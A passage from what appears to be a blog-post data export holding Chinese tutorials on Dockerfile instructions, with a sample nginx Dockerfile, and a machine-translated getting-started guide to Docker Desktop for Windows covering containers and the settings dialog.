/absoluteDir/    # 添加 \"test\" 到 /absoluteDir/</pre>\n\n<p><strong>COPY：功能类似ADD，但是是不会自动解压文件，也不能访问网络资源</strong></p>\n\n<p><strong>CMD：构建容器后调用，也就是在容器启动时才进行调用。</strong></p>\n\n<pre>\n格式：\n    CMD [\"executable\",\"param1\",\"param2\"] (执行可执行文件，优先)\n    CMD [\"param1\",\"param2\"] (设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数)\n    CMD command param1 param2 (执行shell内部命令)\n示例：\n    CMD echo \"This is a test.\" | wc -\n    CMD [\"/usr/bin/wc\",\"--help\"]\n注：\n 　　CMD不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</pre>\n\n<p><strong>ENTRYPOINT：配置容器，使其可执行化。配合CMD可省去\"application\"，只使用参数。</strong></p>\n\n<pre>\n格式：\n    ENTRYPOINT [\"executable\", \"param1\", \"param2\"] (可执行文件, 优先)\n    ENTRYPOINT command param1 param2 (shell内部命令)\n示例：\n    FROM ubuntu\n    ENTRYPOINT [\"top\", \"-b\"]\n    CMD [\"-c\"]\n注：\n　　　ENTRYPOINT与CMD非常类似，不同的是通过<code>docker run</code>执行的命令不会覆盖ENTRYPOINT，而<code>docker run</code>命令中指定的任何参数，都会被当做参数再次传递给ENTRYPOINT。Dockerfile中只允许有一个ENTRYPOINT命令，多指定时会覆盖前面的设置，而只执行最后的ENTRYPOINT指令。</pre>\n\n<p><strong>LABEL：用于为镜像添加元数据</strong></p>\n\n<pre>\n格式：\n    LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...\n示例：\n　　LABEL version=\"1.0\" description=\"这是一个Web服务器\" by=\"IT笔录\"\n注：\n　　使用LABEL指定元数据时，一条LABEL指定可以指定一或多条元数据，指定多条元数据时不同元数据之间通过空格分隔。推荐将所有的元数据通过一条LABEL指令指定，以免生成过多的中间镜像。</pre>\n\n<p><strong>ENV：设置环境变量</strong></p>\n\n<pre>\n格式：\n    ENV &lt;key&gt; &lt;value&gt;  #&lt;key&gt;之后的所有内容均会被视为其&lt;value&gt;的组成部分，因此，一次只能设置一个变量\n    ENV &lt;key&gt;=&lt;value&gt; ...  #可以设置多个变量，每个变量为一个\"&lt;key&gt;=&lt;value&gt;\"的键值对，如果&lt;key&gt;中包含空格，可以使用\\来进行转义，也可以通过\"\"来进行标示；另外，反斜线也可以用于续行\n示例：\n    ENV myName John Doe\n    ENV myDog Rex The Dog\n    ENV myCat=fluffy\n</pre>\n\n<p><strong>EXPOSE：指定于外界交互的端口</strong></p>\n\n<pre>\n格式：\n    EXPOSE &lt;port&gt; [&lt;port&gt;...]\n示例：\n    EXPOSE 80 443\n    EXPOSE 8080\n    EXPOSE 11211/tcp 11211/udp\n注：\n　　EXPOSE并不会让容器的端口访问到主机。要使其可访问，需要在<code>docker run</code>运行容器时通过-p来发布这些端口，或通过<code>-P</code>参数来发布EXPOSE导出的所有端口</pre>\n\n<p><strong>VOLUME：用于指定持久化目录</strong></p>\n\n<pre>\n格式：\n    VOLUME [\"/path/to/dir\"]\n示例：\n    VOLUME [\"/data\"]\n    VOLUME [\"/var/www\", \"/var/log/apache2\", \"/etc/apache2\"\n注：\n　　一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：\n</pre>\n\n<pre>\n1 卷可以容器间共享和重用\n2 容器并不一定要和其它容器共享卷\n3 修改卷后会立即生效\n4 对卷的修改不会对镜像产生影响\n5 卷会一直存在，直到没有任何容器在使用它</pre>\n\n<p><strong>WORKDIR：工作目录，类似于cd命令</strong></p>\n\n<pre>\n格式：\n    WORKDIR /path/to/workdir\n示例：\n    WORKDIR /a  (这时工作目录为/a)\n    WORKDIR b  (这时工作目录为/a/b)\n    WORKDIR c  (这时工作目录为/a/b/c)\n注：\n　　通过WORKDIR设置工作目录后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT、ADD、COPY等命令都会在该目录下执行。在使用<code>docker run</code>运行容器时，可以通过-w参数覆盖构建时所设置的工作目录。</pre>\n\n<p><strong>USER:</strong><strong>指定运行容器时的用户名或 UID，后续的 RUN 也会使用指定用户。使用USER指定用户时，可以使用用户名、UID或GID，或是两者的组合。当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户</strong></p>\n\n<p> 格式:<br>\n　　USER user<br>\n　　USER user:group<br>\n　　USER uid<br>\n　　USER uid:gid<br>\n　　USER user:gid<br>\n　　USER uid:group</p>\n\n<p> 示例：<br>\n　　USER www</p>\n\n<p> 注：</p>\n\n<p>　　使用USER指定用户后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT都将使用该用户。镜像构建完成后，通过<code>docker run</code>运行容器时，可以通过-u参数来覆盖所指定的用户。</p>\n\n<p> </p>\n\n<p><strong>ARG：用于指定传递给构建运行时的变量</strong></p>\n\n<pre>\n格式：\n    ARG &lt;name&gt;[=&lt;default value&gt;]\n示例：\n    ARG site\n    ARG build_user=www</pre>\n\n<p><strong>ONBUILD：用于设置镜像触发器</strong></p>\n\n<p> </p>\n\n<pre>\n格式：\n　　ONBUILD [INSTRUCTION]\n示例：\n　　ONBUILD ADD . /app/src\n　　ONBUILD RUN /usr/local/bin/python-build --dir /app/src\n注：\n　　当所构建的镜像被用做其它镜像的基础镜像，该镜像中的触发器将会被钥触发\n</pre>\n\n<p><strong>以下是一个小例子：</strong></p>\n\n<pre>\n# This my first nginx Dockerfile\n# Version 1.0\n\n# Base images 基础镜像\nFROM centos\n\n#MAINTAINER 维护者信息\nMAINTAINER tianfeiyu \n\n#ENV 设置环境变量\nENV PATH /usr/local/nginx/sbin:$PATH\n\n#ADD  文件放在当前目录下，拷过去会自动解压\nADD nginx-1.8.0.tar.gz /usr/local/  \nADD epel-release-latest-7.noarch.rpm /usr/local/  \n\n#RUN 执行以下命令 \nRUN rpm -ivh /usr/local/epel-release-latest-7.noarch.rpm\nRUN yum install -y wget lftp gcc gcc-c++ make openssl-devel pcre-devel pcre &amp;&amp; yum clean all\nRUN useradd -s /sbin/nologin -M www\n\n#WORKDIR 相当于cd\nWORKDIR /usr/local/nginx-1.8.0 \n\nRUN ./configure --prefix=/usr/local/nginx --user=www --group=www --with-http_ssl_module --with-pcre &amp;&amp; make &amp;&amp; make install\n\nRUN echo \"daemon off;\" &gt;&gt; /etc/nginx.conf\n\n#EXPOSE 映射端口\nEXPOSE 80\n\n#CMD 运行以下命令\nCMD [\"nginx\"]\n</pre>\n\n<p> </p>\n\n<p><strong>最后用一张图解释常用指令的意义^-^</strong></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://images2017.cnblogs.com/blog/911490/201712/911490-20171208222222062-849020400.png\"></p>\n                                    </div>", "log_PostTime": 1584891096, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "docker desktop使用入门", "log_Intro": "docker desktop使用入门", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>Docker是一个用于创建容器化应用程序的完整开发平台，而Docker Desktop for Windows是<em>在Windows上</em>开始使用Docker的最佳方式。</p>\n\n<blockquote>\n<p>有关系统要求和稳定和边缘通道的信息，请参阅<a href=\"https://docs.docker.com/docker-for-windows/install/\" rel=\"nofollow\">安装Docker Desktop for Windows</a>。</p>\n</blockquote>\n\n<h2>测试您的安装</h2>\n\n<ol><li>\n\t<p>打开终端窗口（命令提示符或PowerShell，<em>但不是</em> PowerShell ISE）。</p>\n\t</li>\n\t<li>\n\t<p>运行<code>docker --version</code>以确保您拥有受支持的Docker版本：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker &lt;span style=\"color:#8b008b\"&gt;--version&lt;/span&gt;\n\nDocker version 18.03.0-ce, build 0520e24\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>从Docker Hub中拉出<a href=\"https://hub.docker.com/r/library/hello-world/\" rel=\"nofollow\">hello-world图像</a>并运行一个容器：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker run hello-world\n\ndocker : Unable to find image &lt;span style=\"color:#cd5555\"&gt;'hello-world:latest'&lt;/span&gt; locally\n...\n\nlatest:\nPulling from library/hello-world\nca4f61b1923c:\nPulling fs layer\nca4f61b1923c:\nDownload &lt;span style=\"color:#658b00\"&gt;complete\n&lt;/span&gt;ca4f61b1923c:\nPull &lt;span style=\"color:#658b00\"&gt;complete\n&lt;/span&gt;Digest: sha256:97ce6fa4b6cdc0790cda65fe7290b74cfebd9fa0c9b8c38e979330d547d22ce1\nStatus: Downloaded newer image &lt;span style=\"color:#8b008b\"&gt;for &lt;/span&gt;hello-world:latest\n\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n...\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>列出从Docker Hub下载的<code>hello-world</code> <em>映像</em>：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker image &lt;span style=\"color:#658b00\"&gt;ls&lt;/span&gt;\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>列出<code>hello-world</code> <em>容器</em>（显示“来自Docker的Hello！”后退出）：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker container &lt;span style=\"color:#658b00\"&gt;ls&lt;/span&gt; &lt;span style=\"color:#8b008b\"&gt;--all&lt;/span&gt;\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>通过运行一些帮助命令来探索Docker帮助页面：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker &lt;span style=\"color:#8b008b\"&gt;--help&lt;/span&gt;\n&gt; docker container &lt;span style=\"color:#8b008b\"&gt;--help&lt;/span&gt;\n&gt; docker container &lt;span style=\"color:#658b00\"&gt;ls&lt;/span&gt; &lt;span style=\"color:#8b008b\"&gt;--help&lt;/span&gt;\n&gt; docker run &lt;span style=\"color:#8b008b\"&gt;--help&lt;/span&gt;\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n</ol><h2>探索应用程序</h2>\n\n<p>在本节中，我们通过运行更复杂的东西（如操作系统和Web服务器）来演示Dockerized应用程序的易用性和强大功能。</p>\n\n<ol><li>\n\t<p>拉出<a href=\"https://hub.docker.com/r/_/ubuntu/\" rel=\"nofollow\">Ubuntu操作系统</a>的映像并在生成的容器中运行交互式终端：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker run &lt;span style=\"color:#8b008b\"&gt;--interactive&lt;/span&gt; &lt;span style=\"color:#8b008b\"&gt;--tty&lt;/span&gt; ubuntu bash\n\ndocker : Unable to find image &lt;span style=\"color:#cd5555\"&gt;'ubuntu:latest'&lt;/span&gt; locally\n...\n\nlatest:\nPulling from library/ubuntu\n22dc81ace0ea:\nPulling fs layer\n1a8b3c87dba3:\nPulling fs layer\n91390a1c435a:\nPulling fs layer\n...\nDigest: sha256:e348fbbea0e0a0e73ab0370de151e7800684445c509d46195aef73e090a49bd6\nStatus: Downloaded newer image &lt;span style=\"color:#8b008b\"&gt;for &lt;/span&gt;ubuntu:latest\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\n\t<blockquote>\n\t<p><strong>不要使用PowerShell ISE</strong></p>\n\n\t<p>交互式终端在PowerShell ISE中不起作用（但它们在PowerShell中起作用）。见<a href=\"https://github.com/docker/for-win/issues/223\">docker / for-win / issues / 223</a>。</p>\n\t</blockquote>\n\t</li>\n\t<li>\n\t<p>你在容器里。在根<code>#</code>提示符下，检查<code>hostname</code>容器：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;root@8aea0acb7423:/# hostname\n8aea0acb7423\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\n\t<p>请注意，主机名被指定为容器ID（并且也在提示中使用）。</p>\n\t</li>\n\t<li>\n\t<p>使用<code>exit</code>命令退出shell （这也会停止容器）：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;root@8aea0acb7423:/# &lt;span style=\"color:#658b00\"&gt;exit&lt;/span&gt;\n&gt;\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>使用该<code>--all</code>选项列出容器（因为没有容器正在运行）。</p>\n\n\t<p>所述<code>hello-world</code>容器（随机命名，<code>relaxed_sammet</code>）显示其消息之后停止。该<code>ubuntu</code>容器（随机命名的，<code>laughing_kowalevski</code>当你退出容器）停止。</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker container &lt;span style=\"color:#658b00\"&gt;ls&lt;/span&gt; &lt;span style=\"color:#8b008b\"&gt;--all&lt;/span&gt;\n\nCONTAINER ID    IMAGE          COMMAND     CREATED          STATUS                      PORTS    NAMES\n8aea0acb7423    ubuntu         &lt;span style=\"color:#cd5555\"&gt;\"bash\"&lt;/span&gt;      2 minutes ago    Exited (0) 2 minutes ago             laughing_kowalevski\n45f77eb48e78    hello-world    &lt;span style=\"color:#cd5555\"&gt;\"/hello\"&lt;/span&gt;    3 minutes ago    Exited (0) 3 minutes ago             relaxed_sammet\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>拉动并运行我们命名的Dockerized <a href=\"https://hub.docker.com/_/nginx/\" rel=\"nofollow\">nginx</a> Web服务器<code>webserver</code>：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker run &lt;span style=\"color:#8b008b\"&gt;--detach&lt;/span&gt; &lt;span style=\"color:#8b008b\"&gt;--publish&lt;/span&gt; 80:80 &lt;span style=\"color:#8b008b\"&gt;--name&lt;/span&gt; webserver nginx\n\nUnable to find image &lt;span style=\"color:#cd5555\"&gt;'nginx:latest'&lt;/span&gt; locally\nlatest: Pulling from library/nginx\n\nfdd5d7827f33: Pull &lt;span style=\"color:#658b00\"&gt;complete\n&lt;/span&gt;a3ed95caeb02: Pull &lt;span style=\"color:#658b00\"&gt;complete\n&lt;/span&gt;716f7a5f3082: Pull &lt;span style=\"color:#658b00\"&gt;complete\n&lt;/span&gt;7b10f03a0309: Pull &lt;span style=\"color:#658b00\"&gt;complete\n&lt;/span&gt;Digest: sha256:f6a001272d5d324c4c9f3f183e1b69e9e0ff12debeb7a092730d638c33e0de3e\nStatus: Downloaded newer image &lt;span style=\"color:#8b008b\"&gt;for &lt;/span&gt;nginx:latest\ndfe13c68b3b86f01951af617df02be4897184cbf7a8b4d5caf1c3c5bd3fc267f\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>将Web浏览器指向<code>http://localhost</code>以显示nginx开始页面。（您不需要追加，<code>:80</code>因为您在<code>docker</code>命令中指定了默认HTTP端口。）</p>\n\n\t<p><img alt=\"运行nginx边缘\" class=\"has\" src=\"http://www.pianshen.com/images/287/5657fbd401b69d6ebc5a206a51960f4f.png\"></p>\n\t</li>\n\t<li>\n\t<p>仅列出<em>正在运行的</em>容器：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker container &lt;span style=\"color:#658b00\"&gt;ls\n\n&lt;/span&gt;CONTAINER ID    IMAGE    COMMAND                   CREATED          STATUS          PORTS                 NAMES\n0e788d8e4dfd    nginx    &lt;span style=\"color:#cd5555\"&gt;\"nginx -g 'daemon of…\"&lt;/span&gt;    2 minutes ago    Up 2 minutes    0.0.0.0:80-&gt;80/tcp    webserver\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>按我们分配的名称停止运行的nginx容器<code>webserver</code>：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt;  docker container stop webserver\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n\t<li>\n\t<p>按名称删除所有三个容器 - 后两个名称将因您而异：</p>\n\n\t<pre class=\"has\">\n<code>&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker container rm webserver laughing_kowalevski relaxed_sammet\n&lt;/code&gt;&lt;/span&gt;</code></pre>\n\t</li>\n</ol><h2>Docker设置对话框</h2>\n\n<p>该<strong>泊坞窗Windows版桌面菜单</strong>是通过它可以配置你的码头工人设置一个弹出-安装，更新，版本渠道，多克尔中心登录等。</p>\n\n<p>本节介绍可从“ <strong>设置”</strong>对话框访问的配置选项。</p>\n\n<ol><li>\n\t<p>通过右键单击通知区域（或系统托盘）中的Docker图标，打开Docker Desktop for Windows菜单：</p>\n\n\t<p><img alt=\"在任务栏中显示隐藏的应用程序\" class=\"has\" src=\"http://www.pianshen.com/images/530/4d6b6cd1837f16bbfae295ba104fdada.png\"></p>\n\t</li>\n\t<li>\n\t<p>选择<strong>设置...</strong>以打开“设置”对话框：</p>\n\n\t<p><img alt=\"Docker Desktop for Windows弹出菜单\" class=\"has\" src=\"http://www.pianshen.com/images/237/c67d1ded4f3512d68df7ab10cf00e1ed.png\"></p>\n\t</li>\n</ol><h3>一般</h3>\n\n<p>在“ 设置”对话框的“ <strong>常规”</strong>选项卡上，您可以配置何时启动和更新Docker。</p>\n\n<p><img alt=\"设置\" class=\"has\" src=\"http://www.pianshen.com/images/128/b43ffa0da6b5917e65889863b9f2a6a8.png\"></p>\n\n<ul><li>\n\t<p><strong>登录时启动Docker</strong> - 在Windows系统登录时自动启动Docker Desktop for Windows应用程序。</p>\n\t</li>\n\t<li>\n\t<p><strong>自动检查更新</strong> - 默认情况下，Docker Desktop for Windows会自动检查更新并在更新可用时通知您。单击“ <strong>确定”</strong>接受并安装更新（或取消以保留当前版本）。您可以通过从Docker主菜单中选择<strong>Check for Updates</strong>来手动更新。</p>\n\t</li>\n\t<li>\n\t<p><strong>发送使用情况统计信息</strong> - 默认情况下，Docker Desktop for Windows会发送诊断，崩溃报告和使用情况数据。此信息有助于Docker改进应用程序并对其进行故障排除。取消选中此选项。Docker有时也可能会提示您提供更多信息。</p>\n\t</li>\n</ul><h3>共享驱动器</h3>\n\n<p>使用适用于Windows的Docker Desktop共享本地驱动器（卷），以便它们可供<a href=\"https://docs.docker.com/docker-for-windows/#switch-between-windows-and-linux-containers\" rel=\"nofollow\">Linux容器使用</a>。</p>\n\n<p><img alt=\"共享驱动器\" class=\"has\" src=\"http://www.pianshen.com/images/562/f6c5f232f42d495dbaf73190e7d272ba.png\"></p>\n\n<p>共享驱动器的权限与您在此处提供的凭据相关联。如果<code>docker</code>使用与此处配置的用户名不同的用户名运行命令，则容器无法访问已装入的卷。</p>\n\n<p>要应用共享驱动器，系统会提示您输入Windows系统（域）用户名和密码。您可以选择一个选项让Docker存储凭据，这样您就不必每次都输入凭据。</p>\n\n<blockquote>\n<p><strong>有关共享驱动器，权限和卷装入的提示</strong></p>\n\n<ul><li>\n\t<p>只有在<a href=\"https://docs.docker.com/docker-for-windows/#switch-between-windows-and-linux-containers\" rel=\"nofollow\">Linux容器中</a>装入卷才需要共享驱动器，而不是Windows容器。对于Linux容器，您需要共享Dockerfile和卷所在的驱动器。如果您遇到错误，<code>file not found</code> 或者<code>cannot start service</code>您可能需要启用共享驱动器。请参<a href=\"https://docs.docker.com/docker-for-windows/troubleshoot/#volume-mounting-requires-shared-drives-for-linux-containers\" rel=\"nofollow\">阅卷安装需要Linux容器的共享驱动器</a>。）</p>\n\t</li>\n\t<li>\n\t<p>如果可能，请避免从Windows主机安装卷，而是安装在Linux VM上，或使用<a href=\"https://docs.docker.com/engine/tutorials/dockervolumes/#data-volumes\" rel=\"nofollow\">数据卷</a> （命名卷）或<a href=\"https://docs.docker.com/engine/tutorials/dockervolumes/#creating-and-mounting-a-data-volume-container\" rel=\"nofollow\">数据容器</a>。使用主机安装的卷和数据库文件的网络路径存在许多问题。请参阅<a href=\"https://docs.docker.com/docker-for-windows/troubleshoot/#volume-mounts-from-host-paths-use-a-nobrl-option-to-override-database-locking\" rel=\"nofollow\">主机路径中的卷装入使用nobrl选项来覆盖数据库锁定</a>。</p>\n\t</li>\n\t<li>\n\t<p>Docker Desktop for Windows为用户，组和其他人<a href=\"http://permissions-calculator.org/decode/0777/\" rel=\"nofollow\">0777或+ rwx</a>设置读/写/执行权限。这是不可配置的。请参阅<a href=\"https://docs.docker.com/docker-for-windows/troubleshoot/#permissions-errors-on-data-directories-for-shared-volumes\" rel=\"nofollow\">共享卷的数据目录上的权限错误</a>。</p>\n\t</li>\n\t<li>\n\t<p>确保域用户可以访问共享驱动器，如<a href=\"https://docs.docker.com/docker-for-windows/troubleshoot/#verify-domain-user-has-permissions-for-shared-drives-volumes\" rel=\"nofollow\">验证域用户具有共享驱动器的权限中所述</a>。</p>\n\t</li>\n\t<li>\n\t<p>您可以与<em>容器</em>共享本地驱动器，但不能与Docker Machine节点共享。请参阅常见问题解答，<a href=\"https://docs.docker.com/docker-for-windows/faqs/#can-i-share-local-drives-and-filesystem-with-my-docker-machine-vms\" rel=\"nofollow\">我可以与Docker Machine VM共享本地驱动器和文件系统吗？</a>。</p>\n\t</li>\n</ul></blockquote>\n\n<p>共享驱动器的防火墙规则</p>\n\n<p>共享驱动器要求端口445在主机和运行Linux容器的虚拟机之间打开。Docker检测端口445是否已关闭，并在您尝试添加共享驱动器时显示以下消息：</p>\n\n<p><img alt=\"港口445被封锁\" class=\"has\" src=\"http://www.pianshen.com/images/458/0d714c85df80517bafa44ae70ec074f2.png\"></p>\n\n<p>要共享驱动器，请允许Windows主机与Windows防火墙中的虚拟机或第三方防火墙软件之间建立连接。您无需在任何其他网络上打开端口445。</p>\n\n<p>默认情况下，允许<code>10.0.75.1</code>从<code>10.0.75.2</code>（虚拟机）连接到端口445（Windows主机 ）。如果防火墙规则似乎正确，则可能需要<a href=\"http://stackoverflow.com/questions/42203488/settings-to-windows-firewall-to-allow-docker-for-windows-to-share-drive/43904051#43904051\" rel=\"nofollow\">在Hyper-V虚拟网卡上</a>切换或 <a href=\"http://stackoverflow.com/questions/42203488/settings-to-windows-firewall-to-allow-docker-for-windows-to-share-drive/43904051#43904051\" rel=\"nofollow\">重新安装文件和打印共享服务</a></p>\n\n<p>按需共享驱动器</p>\n\n<p>您可以在第一次请求特定安装时“按需”共享驱动器。</p>\n\n<p>如果从具有卷装入的shell运行Docker命令（如下面的示例所示）或启动包含卷装入的Compose文件，则会弹出一个询问您是否要共享指定驱动器的弹出窗口。</p>\n\n<p>您可以选择<strong>共享它</strong>，在这种情况下，它会添加到Docker Desktop for Windows <a href=\"https://docs.docker.com/docker-for-windows/#shared-drives\" rel=\"nofollow\">Shared Drives列表</a>并可供容器使用。或者，您可以选择不通过点击取消来共享它。</p>\n\n<p><img alt=\"按需共享驱动器\" class=\"has\" src=\"http://www.pianshen.com/images/739/c1d07c28e49b39c5d57bcb9f6bf6bd6b.png\"></p>\n\n<h3>高级</h3>\n\n<p>更改“高级”选项卡上的设置后，Linux VM将重新启动。这需要几秒钟。</p>\n\n<p><img alt=\"CPU和内存设置\" class=\"has\" src=\"http://www.pianshen.com/images/367/e058561fb932a6c9f393f1733b6c4e37.png\"></p>\n\n<ul><li>\n\t<p><strong>CPU</strong> - 更改分配给Linux VM的处理器数量。</p>\n\t</li>\n\t<li>\n\t<p><strong>内存</strong> - 更改Docker Desktop for Windows Linux VM使用的内存量。</p>\n\t</li>\n</ul><h3>网络</h3>\n\n<p>您可以将Docker Desktop for Windows网络配置为在虚拟专用网络（v*n）上工作。</p>\n\n<p><img alt=\"网络设置\" class=\"has\" src=\"http://www.pianshen.com/images/758/0b051e996ff9a69f6ee982f983c5956e.png\"></p>\n\n<ul><li>\n\t<p><strong>内部虚拟交换机</strong> - 您可以指定网络地址转换（NAT）前缀和子网掩码以启用Internet连接。</p>\n\t</li>\n\t<li>\n\t<p><strong>DNS服务器</strong> - 您可以将DNS服务器配置为使用动态或静态IP寻址。</p>\n\t</li>\n</ul><blockquote>\n<p><strong>注意</strong>：某些用户报告在Docker Desktop for Windows稳定版本上连接到Docker Hub时出现问题。当尝试运行<code>docker</code>从Docker Hub中提取尚未下载的图像的命令（例如第一次运行）时，这将显示为错误 <code>docker run hello-world</code>。如果遇到此问题，请重置DNS服务器以使用Google DNS固定地址： <code>8.8.8.8</code>。有关更多信息，请参阅 故障排除中的<a href=\"https://docs.docker.com/docker-for-windows/troubleshoot/#networking-issues\" rel=\"nofollow\">网络问题</a></p>\n</blockquote>\n\n<p>更新这些设置需要重新配置并重新启动Linux VM。</p>\n\n<h3>代理</h3>\n\n<p>Docker Desktop for Windows允许您配置HTTP / HTTPS代理设置并自动将这些设置传播到Docker和容器。例如，如果将代理设置设置为<code>http://proxy.example.com</code>，则Docker在提取容器时会使用此代理。</p>\n\n<p><img alt=\"代理\" class=\"has\" src=\"http://www.pianshen.com/images/373/7313b08a22e292c1ef607096a208682d.png\"></p>\n\n<p>启动容器时，代理设置会传播到容器中。例如：</p>\n\n<pre class=\"has\">\n<code>&gt; docker run alpine env\n\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOSTNAME=b7edf988b2b5\nTERM=xterm\nHOME=/root\nHTTP_PROXY=http://proxy.example.com:3128\nhttp_proxy=http://proxy.example.com:3128\nno_proxy=*.local, 169.254/16\n</code></pre>\n\n<p>在输出上文中，<code>HTTP_PROXY</code>，<code>http_proxy</code>，和<code>no_proxy</code>环境变量设置。当您的代理配置更改时，Docker会自动重新启动以获取新设置。如果您希望在重新启动时继续运行容器，则应考虑使用 <a href=\"https://docs.docker.com/engine/reference/run/#restart-policies-restart\" rel=\"nofollow\">重新启动策略</a>。</p>\n\n<p> </p>\n\n<h3>守护进程</h3>\n\n<p>您可以配置Docker守护程序来磨练容器的运行方式。 <strong>高级模式</strong>允许您直接编辑JSON。<strong>基本模式</strong>允许您使用交互设置（以及JSON）配置更常见的守护程序选项。</p>\n\n<p><img alt=\"Docker守护进程\" class=\"has\" src=\"http://www.pianshen.com/images/368/97fbe911dcdcc0763ab9ef0bed36a408.png\"></p>\n\n<p>实验模式</p>\n\n<p>Docker Desktop for Windows Stable和Edge版本都启用了Docker Engine的实验版本，在GitHub上的<a href=\"https://github.com/docker/cli/blob/master/experimental/README.md\">Docker实验特性README中</a>有所描述。</p>\n\n<p>实验性功能不适用于生产环境或工作负载。它们是用于新想法的沙盒实验。一些实验性功能可能会合并到即将发布的稳定版本中，但其他版本可能会从后续Edge版本中修改或删除，并且永远不会在Stable上发布。</p>\n\n<p>在Edge和Stable版本上，您可以打开和关闭<strong>实验模式</strong>。如果您将其关闭，Docker Desktop for Windows将使用当前常用的Docker Engine版本。</p>\n\n<p>运行<code>docker version</code>以查看您是否处于实验模式。实验模式列在<code>Server</code>数据下。如果<code>Experimental</code>是<code>true</code>，那么Doc​​ker正在以实验模式运行，如下所示：</p>\n\n<pre class=\"has\">\n<code>&lt;span style=\"color:#33444c\"&gt;&lt;span style=\"color:#333333\"&gt;&lt;code&gt;&gt; docker version\n\nClient:\n Version:       18.03.0-ce\n API version:   1.37\n Go version:    go1.9.4\n Git commit:    0520e24\n Built: Wed Mar 21 23:06:28 2018\n OS/Arch:       windows/amd64\n Experimental:  &lt;span style=\"color:#658b00\"&gt;true\n &lt;/span&gt;Orchestrator:  swarm\n\nServer:\n Engine:\n  Version:      18.03.0-ce\n  API version:  1.37 (minimum version 1.24)\n  Go version:   go1.9.4\n  Git commit:   0520e24\n  Built:        Wed Mar 21 23:21:06 2018\n  OS/Arch:      windows/amd64\n  Experimental: &lt;span style=\"color:#658b00\"&gt;true&lt;/span&gt;\n&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;</code></pre>\n\n<p>自定义注册表</p>\n\n<p>您可以在<strong>基本</strong> 守护程序设置上设置自己的<a href=\"https://docs.docker.com/registry/introduction/\" rel=\"nofollow\">注册表</a>。</p>\n\n<p>通常，您将公共或私有映像存储在<a href=\"https://hub.docker.com/\" rel=\"nofollow\">Docker Hub</a> 和<a href=\"https://docs.docker.com/datacenter/dtr/2.4/guides/\" rel=\"nofollow\">Docker Trusted Registry中</a>。在这里，您可以使用Docker来设置自己的不安全<a href=\"https://docs.docker.com/registry/introduction/\" rel=\"nofollow\">注册表</a>。只需为托管图像的不安全注册表和注册表镜像添加URL。</p>\n\n<p>请参阅<a href=\"https://docs.docker.com/docker-for-windows/faqs/#how-do-i-add-custom-ca-certificates\" rel=\"nofollow\">如何添加自定义CA证书？</a> 以及<a href=\"https://docs.docker.com/docker-for-windows/faqs/#how-do-i-add-client-certificates\" rel=\"nofollow\">如何添加客户端证书？</a>在常见问题解答中。</p>\n\n<p>守护进程配置文件</p>\n\n<p>该<strong>高级</strong>守护程序设置提供原件选项直接编辑JSON配置文件的<a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/\" rel=\"nofollow\">守护进程</a>。</p>\n\n<blockquote>\n<p>更新这些设置需要重新配置并重新启动Linux VM。</p>\n</blockquote>\n\n<p><img alt=\"Docker守护进程\" class=\"has\" src=\"http://www.pianshen.com/images/656/2d5229a529c5afc75d8d6f4717541a48.png\"></p>\n\n<p>有关Docker守护程序的完整选项列表，请参阅<a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/\" rel=\"nofollow\">守护程序</a>以及子主题：</p>\n\n<ul><li>\n\t<p><a 